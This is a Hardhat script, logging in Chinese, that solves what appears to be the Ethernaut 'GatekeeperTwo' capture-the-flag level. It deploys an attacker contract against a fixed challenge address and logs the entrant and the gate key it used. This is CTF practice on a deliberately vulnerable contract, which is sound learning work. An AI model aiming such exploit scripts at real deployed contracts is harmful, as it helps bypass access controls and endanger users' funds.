import hre from "hardhat";
const { ethers } = hre;

const CONTRACT_ADDRESS = "0x9e2e89A424BA12Fbe8c999a0F5261Ce2FaF72732";

async function main() {
    const [signer] = await ethers.getSigners();
    console.log("我的帳戶地址 : ", signer.address);

    const gatekeeperTwo = await ethers.getContractAt("GatekeeperTwo", CONTRACT_ADDRESS);
    console.log("gatekeeperTwo 關卡實例地址: ", CONTRACT_ADDRESS);
    console.log("目前的 gatekeeperTwo entrant: ", await gatekeeperTwo.entrant());

    // =========進攻開始===========
    const Contract = await ethers.getContractFactory("GatekeeperTwoAttacker");
    const contract = await Contract.deploy(CONTRACT_ADDRESS);
    await contract.waitForDeployment();
      
    console.log("GatekeeperTwoAttacker Contract deployed to: ", await contract.getAddress());

    console.log("目前的 gatekeeperTwo entrant: ", await gatekeeperTwo.entrant());
    
    const gatekeeperTwoAttacker = await ethers.getContractAt("GatekeeperTwoAttacker", await contract.getAddress());
    console.log("所使用的 gateKey : ", await gatekeeperTwoAttacker.gateKey());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });